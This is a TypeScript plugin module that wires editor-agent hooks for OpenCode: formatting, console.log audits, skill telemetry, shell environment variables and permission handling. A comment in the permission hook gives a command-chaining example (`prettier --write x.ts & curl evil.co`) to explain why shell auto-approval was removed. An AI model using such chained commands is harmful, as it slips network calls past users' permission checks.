/** Shared hook state and behavior used by both OpenCode registration surfaces. */
import * as fs from "fs"
import * as path from "path"
import { pathToFileURL } from "url"
import {
  ECC_ROOT_PROBES, countConsoleLogs, findEccRootDir, getECCVersion, loadToolModule, run,
} from "./ecc-runtime-support.ts"
import type {
  HookProfile, LooseRecord, PermissionEvent, ToolArgs, ToolInput,
} from "./ecc-runtime-support.ts"

/** The shared runtime: every hook body lives here exactly once. */
interface EccRuntime {
  /** V1-shaped hook map (also used by the V2 adapters below). */
  hooks: Record<string, any>
  /** V1-shaped custom tool record. */
  tool: Record<string, unknown>
  /** ECC context block preserved through compaction (V2 registration uses it). */
  buildCompactionContext: () => string
  /** The project directory this runtime was built for. */
  worktreePath: string
}

export async function createEccRuntime(input: {
  client?: { app?: { log?: (event: { body: LooseRecord }) => unknown } }
  $?: unknown
  directory?: string
  worktree?: string
}, pluginDir: string): Promise<EccRuntime> {
  const { client } = input
  const worktreePath = input.worktree || input.directory || process.cwd()

  const editedFiles = new Set<string>()
  const pendingToolChanges = new Map<string, { path: string; type: "added" | "modified" }>()
  let writeCounter = 0

  function resolvePath(p: string): string {
    if (path.isAbsolute(p)) return p
    return path.join(worktreePath, p)
  }

  function hasProjectFile(relativePath: string): boolean {
    try {
      return fs.statSync(resolvePath(relativePath)).isFile()
    } catch {
      return false
    }
  }

  function getFilePath(args: ToolArgs | undefined): string | null {
    if (!args) return null
    const p = (args.filePath ?? args.file_path ?? args.path) as string | undefined
    return typeof p === "string" && p.trim() ? p : null
  }

  // V1 logged through the SDK client; V2 has no client.app.log, so the console
  // fallback writes into the server log, which is where those messages ended
  // up anyway.
  const log = (level: "debug" | "info" | "warn" | "error", message: string) => {
    if (typeof client?.app?.log === "function") {
      return client.app.log({ body: { service: "ecc", level, message } })
    }
    try {
      const line = `[ecc] ${message}`
      if (level === "error") console.error(line)
      else if (level === "warn") console.warn(line)
      else if (level === "debug") console.debug(line)
      else console.info(line)
    } catch {
      // Logging must never break a hook.
    }
  }

  // Loaded lazily (instead of via a top-level import) so that a missing or
  // partially-installed `~/.opencode/plugins/lib` directory (e.g. an
  // interrupted or partial ECC install on Termux/Android) only disables
  // changed-files tracking, rather than throwing during module evaluation.
  // This plugin is OpenCode's startup entry point, so a static import
  // failure here previously crashed the whole plugin -- and with it, the
  // entire OpenCode session -- before any hooks could load (see #2530).
  // The relative ".ts" specifier is rewritten to ".js" by tsc in the compiled
  // layout and resolved natively by OpenCode's TS loader in a source layout.
  let changedFilesStore: typeof import("./changed-files-store.ts") | undefined
  try {
    const store = await import("./changed-files-store.ts")
    store.initStore?.(worktreePath)
    changedFilesStore = store
  } catch {
    // Best-effort diagnostic only: deferred via .then() (rather than
    // Promise.resolve(log(...))) so that even a *synchronous* throw inside
    // log() -- not just an async rejection -- is caught here instead of
    // escaping this catch block. The raw loader error is intentionally not
    // included in the message since it can contain absolute filesystem
    // paths; this whole block exists to guarantee startup resilience even
    // when things go wrong.
    Promise.resolve()
      .then(() =>
        log(
          "warn",
          "[ECC] changed-files tracking disabled: could not load the changed-files store. " +
            "Run `ecc repair --target opencode` to restore the missing files. Other ECC hooks are unaffected.",
        ),
      )
      .catch(() => {})
  }

  // Claude Code routes post:skill:track through
  // scripts/hooks/posttooluse-dispatcher.js, which OpenCode never invokes.
  // Without a caller here, nothing ever writes skill-runs.jsonl and
  // `skills-health.js --dashboard` has no data to report on any skill (#2463).
  //
  // The tracker module is reused rather than reimplemented so its identifier
  // validation, length bounds and "never persist prompt text" guarantees stay
  // the ones that were written and audited for the Claude Code path.
  //
  // Loaded lazily, for the same reason as the store above. A runtime file URL
  // also keeps tsc from resolving a relative specifier that exists in no
  // compiled layout.
  let recordSkillRun: ((payload: unknown) => void) | undefined
  // Detection is scoped to the tracker itself, so a modular install that omits
  // optional content still gets telemetry.
  const trackerRoot = findEccRootDir(pluginDir, ECC_ROOT_PROBES.skillTracker)
  // The root advertised to commands is a different question: those commands
  // require the resolver, so a root without it would break them again.
  const eccRoot =
    findEccRootDir(pluginDir, ECC_ROOT_PROBES.resolver) ?? findEccRootDir(pluginDir, ECC_ROOT_PROBES.root)
  try {
    const trackerPath = trackerRoot ? path.join(trackerRoot, "scripts", "hooks", "skill-run-tracker.js") : null
    if (!trackerPath || !fs.existsSync(trackerPath)) {
      throw new Error("skill-run-tracker.js not found")
    }
    // CJS module loaded from ESM: run() is on the namespace in Node/Bun, but a
    // transpiled default export must stay supported.
    const loaded = (await import(pathToFileURL(trackerPath).href)) as {
      run?: (payload: unknown) => void
      default?: { run?: (payload: unknown) => void }
    }
    const entry = typeof loaded.run === "function" ? loaded : loaded.default
    if (!entry || typeof entry.run !== "function") {
      throw new Error("skill-run-tracker.js exposes no run()")
    }
    recordSkillRun = entry.run
  } catch {
    // Same deferred-log rationale as the store above: guarantee that a
    // telemetry failure can never escape this catch and abort startup.
    Promise.resolve()
      .then(() =>
        log(
          "warn",
          "[ECC] skill-run telemetry disabled: could not load scripts/hooks/skill-run-tracker.js. " +
            "Run `ecc repair --target opencode` to restore the missing files. Other ECC hooks are unaffected.",
        ),
      )
      .catch(() => {})
  }

  const normalizeProfile = (value: string | undefined): HookProfile => {
    if (value === "minimal" || value === "strict") return value
    return "standard"
  }

  const currentProfile = normalizeProfile(process.env.ECC_HOOK_PROFILE)
  const disabledHooks = new Set(
    (process.env.ECC_DISABLED_HOOKS || "")
      .split(",")
      .map((item) => item.trim())
      .filter(Boolean),
  )

  const profileOrder: Record<HookProfile, number> = { minimal: 0, standard: 1, strict: 2 }

  const profileAllowed = (required: HookProfile | HookProfile[]): boolean => {
    if (Array.isArray(required)) {
      return required.some((entry) => profileOrder[currentProfile] >= profileOrder[entry])
    }
    return profileOrder[currentProfile] >= profileOrder[required]
  }

  const hookEnabled = (
    hookId: string,
    requiredProfile: HookProfile | HookProfile[] = "standard",
  ): boolean => {
    if (disabledHooks.has(hookId)) return false
    return profileAllowed(requiredProfile)
  }

  /**
   * Prettier auto-format + console.log warning + change tracking.
   * (Equivalent to Claude Code PostToolUse hook for prettier.)
   */
  const onFileEdited = async (event: { path: string }) => {
    try {
      editedFiles.add(event.path)
      changedFilesStore?.recordChange?.(event.path, "modified")

      // Auto-format JS/TS files (strict profile only: it shells out).
      if (hookEnabled("post:edit:format", ["strict"]) && /\.(ts|tsx|js|jsx)$/.test(event.path)) {
        try {
          const result = await run("npx", ["prettier", "--write", event.path], { cwd: worktreePath })
          // T11: a non-zero exit is a failure, not a success. Only log
          // "Formatted" when prettier actually ran and wrote the file.
          if (result.code === 0) {
            log("info", `[ECC] Formatted: ${event.path}`)
          } else {
            const detail = (result.stderr || result.stdout || "").trim().slice(0, 200)
            log("warn", `[ECC] Prettier failed for ${event.path} (exit ${result.code})${detail ? `: ${detail}` : ""}`)
          }
        } catch (error: unknown) {
          // Prettier could not be spawned at all - log but continue
          const errorMessage = error instanceof Error ? error.message : String(error)
          log("debug", `[ECC] Prettier formatting failed for ${event.path}: ${errorMessage}`)
        }
      }

      // Console.log warning check (fs+regex: grep is not available on Windows).
      if (hookEnabled("post:edit:console-warn", ["standard", "strict"]) && /\.(ts|tsx|js|jsx)$/.test(event.path)) {
        const count = await countConsoleLogs(resolvePath(event.path)).catch(() => 0)
        if (count > 0) {
          log(
            "warn",
            `[ECC] console.log found in ${event.path} (${count} occurrence${count > 1 ? "s" : ""})`,
          )
        }
      }
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : String(error)
      log("debug", `[ECC] file.edited hook failed: ${errorMessage}`)
    }
  }

  /**
   * Advisory pre-tool callback: change bookkeeping, git-push/tmux reminders,
   * and doc-file warnings. This does not invoke canonical ECC Bash guards.
   */
  const onToolBefore = async (input: ToolInput) => {
    try {
      if (input.tool === "write") {
        const filePath = getFilePath(input.args)
        if (filePath) {
          const absPath = resolvePath(filePath)
          let type: "added" | "modified" = "modified"
          try {
            type = fs.existsSync(absPath) ? "modified" : "added"
          } catch {
            type = "modified"
          }
          const key = input.callID ?? `write-${++writeCounter}-${filePath}`
          pendingToolChanges.set(key, { path: filePath, type })
        }
      }

      // Git push review reminder
      if (hookEnabled("pre:bash:git-push-reminder", "strict") && input.tool === "bash") {
        const cmd = String(input.args?.command ?? input.args ?? "")
        if (cmd.includes("git push")) {
          log("info", "[ECC] Remember to review changes before pushing: git diff origin/main...HEAD")
        }
      }

      // Warn about potentially unnecessary documentation files
      if (hookEnabled("pre:write:doc-file-warning", ["standard", "strict"]) && input.tool === "write") {
        const filePath = getFilePath(input.args)
        if (
          filePath &&
          /\.(md|txt)$/i.test(filePath) &&
          !filePath.includes("README") &&
          !filePath.includes("CHANGELOG") &&
          !filePath.includes("LICENSE") &&
          !filePath.includes("CONTRIBUTING")
        ) {
          log("warn", `[ECC] Creating ${filePath} - consider if this documentation is necessary`)
        }
      }

      // Long-running command reminder
      if (hookEnabled("pre:bash:tmux-reminder", "strict") && input.tool === "bash") {
        const cmd = String(input.args?.command ?? input.args ?? "")
        if (
          cmd.match(/^(npm|pnpm|yarn|bun)\s+(install|build|test|run)/) ||
          cmd.match(/^cargo\s+(build|test|run)/) ||
          cmd.match(/^go\s+(build|test|run)/)
        ) {
          log("info", "[ECC] Long-running command detected - consider using background execution")
        }
      }
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : String(error)
      log("debug", `[ECC] tool.execute.before hook failed: ${errorMessage}`)
    }
  }

  /**
   * Post-tool: change recording, typecheck, PR log, skill telemetry.
   * (Equivalent to Claude Code PostToolUse hook for tsc.)
   */
  const onToolAfter = async (input: ToolInput, output: unknown) => {
    try {
      const filePath = getFilePath(input.args)
      if (input.tool === "edit" && filePath) {
        changedFilesStore?.recordChange?.(filePath, "modified")
      }
      if (input.tool === "write" && filePath) {
        const key = input.callID ?? `write-${++writeCounter}-${filePath}`
        const pending = pendingToolChanges.get(key)
        if (pending) {
          changedFilesStore?.recordChange?.(pending.path, pending.type)
          pendingToolChanges.delete(key)
        } else {
          changedFilesStore?.recordChange?.(filePath, "modified")
        }
      }

      // Check if a TypeScript file was edited
      if (
        hookEnabled("post:edit:typecheck", ["strict"]) &&
        input.tool === "edit" &&
        typeof input.args?.filePath === "string" &&
        /\.tsx?$/.test(input.args.filePath)
      ) {
        const result = await run("npx", ["tsc", "--noEmit"], { cwd: worktreePath }).catch(() => null)
        if (result && result.code === 0) {
          log("info", "[ECC] TypeScript check passed")
        } else if (result) {
          log("warn", "[ECC] TypeScript errors detected:")
          const out = (result.stdout || result.stderr || "").split("\n").slice(0, 5)
          out.forEach((line) => line.trim() && log("warn", `  ${line}`))
        }
      }

      // PR creation logging
      if (
        hookEnabled("post:bash:pr-created", ["standard", "strict"]) &&
        input.tool === "bash" &&
        String(input.args?.command ?? input.args ?? "").includes("gh pr create")
      ) {
        log("info", "[ECC] PR created - check GitHub Actions status")
      }

      // Skill telemetry (#2463). OpenCode's tool is named `skill`, so the
      // harness-side name is matched here (case-insensitively) and the payload
      // is handed over in the shape the tracker already understands.
      if (
        hookEnabled("post:skill:track", ["standard", "strict"]) &&
        typeof input.tool === "string" &&
        input.tool.trim().toLowerCase() === "skill"
      ) {
        try {
          recordSkillRun?.({
            tool_name: "Skill",
            tool_input: input.args ?? {},
            tool_response: output,
          })
        } catch {
          // Telemetry is best-effort; never let it affect the tool result.
        }
      }
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : String(error)
      log("debug", `[ECC] tool.execute.after hook failed: ${errorMessage}`)
    }
  }

  /** Session Created Hook (Equivalent to Claude Code SessionStart hook). */
  const onSessionCreated = async () => {
    if (!hookEnabled("session:start", ["minimal", "standard", "strict"])) return
    log("info", `[ECC] Session started - profile=${currentProfile}`)
    if (hasProjectFile("CLAUDE.md")) {
      log("info", "[ECC] Found CLAUDE.md - loading project context")
    }
  }

  /**
   * Session Idle Hook (Equivalent to Claude Code Stop hook): console.log
   * audit on all edited files + desktop notification.
   */
  const onSessionIdle = async () => {
    if (!hookEnabled("stop:check-console-log", ["minimal", "standard", "strict"])) return
    if (editedFiles.size === 0) return

    log("info", "[ECC] Session idle - running console.log audit")

    let totalConsoleLogCount = 0
    const filesWithConsoleLogs: string[] = []

    for (const file of editedFiles) {
      if (!/\.(ts|tsx|js|jsx)$/.test(file)) continue
      const count = await countConsoleLogs(resolvePath(file)).catch(() => 0)
      if (count > 0) {
        totalConsoleLogCount += count
        filesWithConsoleLogs.push(file)
      }
    }

    if (totalConsoleLogCount > 0) {
      log(
        "warn",
        `[ECC] Audit: ${totalConsoleLogCount} console.log statement(s) in ${filesWithConsoleLogs.length} file(s)`,
      )
      filesWithConsoleLogs.forEach((f) => log("warn", `  - ${f}`))
      log("warn", "[ECC] Remove console.log statements before committing")
    } else {
      log("info", "[ECC] Audit passed: No console.log statements found")
    }

    // Desktop notification, best effort and never blocking. The V1 Windows
    // path opened a modal MessageBox on the server; that is replaced with a
    // fire-and-forget balloon tip, and every branch is detached.
    try {
      if (process.platform === "darwin") {
        await run("osascript", ["-e", 'display notification "Task completed!" with title "OpenCode ECC"'], {
          detached: true,
        }).catch(() => {})
      } else if (process.platform === "win32") {
        const ps =
          "$ni = New-Object System.Windows.Forms.NotifyIcon; $ni.Icon = [System.Drawing.SystemIcons]::Information; " +
          "$ni.Visible = $true; $ni.ShowBalloonTip('OpenCode ECC', 'Task completed!', 'Info'); " +
          "Start-Sleep -Seconds 5; $ni.Dispose()"
        await run(
          "powershell",
          ["-NoProfile", "-WindowStyle", "Hidden", "-Command", `Add-Type -AssemblyName System.Windows.Forms; ${ps}`],
          { detached: true },
        ).catch(() => {})
      } else if (process.platform === "linux") {
        await run("notify-send", ["OpenCode ECC", "Task completed!"], { detached: true }).catch(() => {})
      }
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : String(error)
      log("debug", `[ECC] Desktop notification failed: ${errorMessage}`)
    }

    // Clear tracked files for next task
    editedFiles.clear()
  }

  /** Session Deleted Hook (Equivalent to Claude Code SessionEnd hook). */
  const onSessionDeleted = async () => {
    if (!hookEnabled("session:end-marker", ["minimal", "standard", "strict"])) return
    log("info", "[ECC] Session ended - cleaning up")
    editedFiles.clear()
    changedFilesStore?.clearChanges?.()
    pendingToolChanges.clear()
  }

  /** File Watcher Hook (OpenCode-only): keeps tracking in sync with external edits. */
  const onFileWatcherUpdated = async (event: { path: string; type: string }) => {
    let changeType: "added" | "modified" | "deleted" = "modified"
    if (event.type === "create" || event.type === "add") changeType = "added"
    else if (event.type === "delete" || event.type === "remove") changeType = "deleted"
    changedFilesStore?.recordChange?.(event.path, changeType)
    if (event.type === "change" && /\.(ts|tsx|js|jsx)$/.test(event.path)) {
      editedFiles.add(event.path)
    }
  }

  /** Todo Updated Hook (OpenCode-only): logs progress. */
  const onTodoUpdated = async (event: { todos: Array<{ text?: string; done: boolean }> }) => {
    const todos = Array.isArray(event.todos) ? event.todos : []
    const completed = todos.filter((t) => t.done).length
    const total = todos.length
    if (total > 0) {
      log("info", `[ECC] Progress: ${completed}/${total} tasks completed`)
    }
  }

  /**
   * Shell Environment Hook (OpenCode-specific): inject ECC context into
   * shell commands. PROJECT_ROOT/PACKAGE_MANAGER/... are computed per call
   * because project marker files can appear after plugin init.
   */
  const onShellEnv = async (_input: { cwd: string }, output: { env: Record<string, string> }) => {
    if (!output) return
    const env: Record<string, string> = {
      ECC_VERSION: getECCVersion(eccRoot, pluginDir),
      ECC_PLUGIN: "true",
      ECC_HOOK_PROFILE: currentProfile,
      ECC_DISABLED_HOOKS: process.env.ECC_DISABLED_HOOKS || "",
      PROJECT_ROOT: worktreePath,
    }

    // Detect package manager (fs only: no shell probing, so this works on Windows).
    const lockfiles: Record<string, string> = {
      "bun.lockb": "bun",
      "pnpm-lock.yaml": "pnpm",
      "yarn.lock": "yarn",
      "package-lock.json": "npm",
    }
    for (const [lockfile, pm] of Object.entries(lockfiles)) {
      if (hasProjectFile(lockfile)) {
        env.PACKAGE_MANAGER = pm
        break
      }
    }

    // Detect languages
    const langDetectors: Record<string, string> = {
      "tsconfig.json": "typescript",
      "go.mod": "go",
      "pyproject.toml": "python",
      "Cargo.toml": "rust",
      "Package.swift": "swift",
    }
    const detected: string[] = []
    for (const [file, lang] of Object.entries(langDetectors)) {
      if (hasProjectFile(file)) {
        detected.push(lang)
      }
    }
    if (detected.length > 0) {
      env.DETECTED_LANGUAGES = detected.join(",")
      env.PRIMARY_LANGUAGE = detected[0]
    }

    // resolve-ecc-root.js only probes ~/.claude and Claude Code's plugin
    // cache, so under OpenCode it fell back to ~/.claude and every command
    // carrying the inlined resolver failed to find its scripts. That resolver
    // reads CLAUDE_PLUGIN_ROOT first, so exporting the root here fixes them
    // through the mechanism ECC already provides -- rather than editing the
    // command files that embed the locator.
    //
    // Only set when a root actually exists, and never replace a root someone
    // else already chose: neither the process environment (set by the user)
    // nor `output.env` (set by an earlier plugin). The final merge below
    // overwrites output.env, so checking it only in `env` would clobber it.
    const rootAlreadySet = Boolean(
      (process.env.CLAUDE_PLUGIN_ROOT || "").trim() || (output.env?.CLAUDE_PLUGIN_ROOT || "").trim(),
    )
    if (eccRoot && !rootAlreadySet) {
      env.CLAUDE_PLUGIN_ROOT = eccRoot
    }

    // OpenCode reads the supplied output object and ignores callback return values.
    output.env = { ...output.env, ...env }
  }

  /** ECC context block preserved through compaction. */
  function buildCompactionContext(): string {
    const contextBlock = [
      "# ECC Context (preserve across compaction)",
      "",
      `## Active Plugin: ECC v${getECCVersion(eccRoot, pluginDir)}`,
      "- Hooks: file.edited, tool.execute.before/after, session.created/idle/deleted, shell.env, compacting, permission.ask",
      "- Tools: changed-files, dependency-analyzer",
      "",
      "## Key Principles",
      "- TDD: write tests first, 80%+ coverage",
      "- Immutability: never mutate, always return new copies",
      "- Security: validate inputs, no hardcoded secrets",
      "",
    ]

    // Include recently edited files
    if (editedFiles.size > 0) {
      contextBlock.push("## Recently Edited Files")
      for (const f of editedFiles) {
        contextBlock.push(`- ${f}`)
      }
      contextBlock.push("")
    }

    return [
      contextBlock.join("\n"),
      "Focus on preserving: 1) Current task status and progress, 2) Key decisions made, 3) Files created/modified, 4) Remaining work items, 5) Any security concerns flagged. Discard: verbose tool outputs, intermediate exploration, redundant file listings.",
    ].join("\n\n")
  }

  /**
   * Session Compacting Hook (OpenCode-specific): append ECC context without
   * replacing the host (or an earlier plugin's) compaction prompt.
   */
  const onSessionCompacting = async (
    _input: { sessionID: string },
    output: { context: string[]; prompt?: string },
  ) => {
    const eccContext = buildCompactionContext()
    // OpenCode requires output assignment and skips context when a prompt is set.
    if (output && output.prompt !== undefined) {
      output.prompt = [output.prompt, eccContext].join("\n\n")
    } else if (output) {
      output.context = [...output.context, eccContext]
    }
  }

  /**
   * Permission Auto-Approve Hook (OpenCode-specific): auto-approve reads,
   * formatters, and test commands on top of the configured rules.
   */
  const onPermissionAsk = async (event: PermissionEvent) => {
    log("info", `[ECC] Permission requested for: ${event.tool}`)

    try {
      // Handle both string args and object args with command property
      let cmd: string
      if (typeof event.args === "string") {
        cmd = event.args
      } else if (event.args && typeof event.args === "object") {
        cmd = String((event.args as Record<string, unknown>).command || "")
      } else {
        cmd = String(event.args || "")
      }
      if (cmd) {
        log("debug", `[ECC] Permission resource: ${cmd.slice(0, 120)}`)
      }

      // Auto-approve: read/search tools
      if (["read", "glob", "grep", "search", "list"].includes(event.tool)) {
        log("debug", `[ECC] Auto-approved read-only tool: ${event.tool}`)
        return { approved: true, reason: "Read-only operation" }
      }

      // T02: no shell-command auto-approval. A regex over the leading
      // characters of a free-form shell string is not a safe allow-list —
      // cmd/powershell argument modes, quoting, and subshell syntax can all
      // defeat it (e.g. `prettier --write x.ts & curl evil.co`, or PowerShell
      // `(prettier)`). Formatter and test commands fall through to the user's
      // permission system instead.

      // Everything else: let user decide
      log("debug", `[ECC] Permission requires user approval: ${event.tool}`)
      return { approved: undefined }
    } catch (error: unknown) {
      // Error in permission handling - log and deny for safety
      const errorMessage = error instanceof Error ? error.message : String(error)
      log("error", `[ECC] Permission handling error for ${event.tool}: ${errorMessage}`)
      return { approved: false, reason: `Error: ${errorMessage}` }
    }
  }

  // V1 custom tool record: definitions load lazily; a broken tools/ install
  // surfaces only when a tool is actually invoked, never at startup.
  const tool: Record<string, unknown> = {}
  for (const name of ["changed-files", "dependency-analyzer"]) {
    try {
      const definition = await loadToolModule(name, pluginDir)
      tool[name] = definition
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : String(error)
      log("warn", `[ECC] Custom tool ${name} disabled: ${errorMessage}`)
    }
  }

  const hooks: Record<string, any> = {
    "file.edited": onFileEdited,
    "tool.execute.before": onToolBefore,
    "tool.execute.after": onToolAfter,
    "session.created": onSessionCreated,
    "session.idle": onSessionIdle,
    "session.deleted": onSessionDeleted,
    "file.watcher.updated": onFileWatcherUpdated,
    "todo.updated": onTodoUpdated,
    "shell.env": onShellEnv,
    "experimental.session.compacting": onSessionCompacting,
    "permission.ask": onPermissionAsk,
  }

  return { hooks, tool, buildCompactionContext, worktreePath }
}
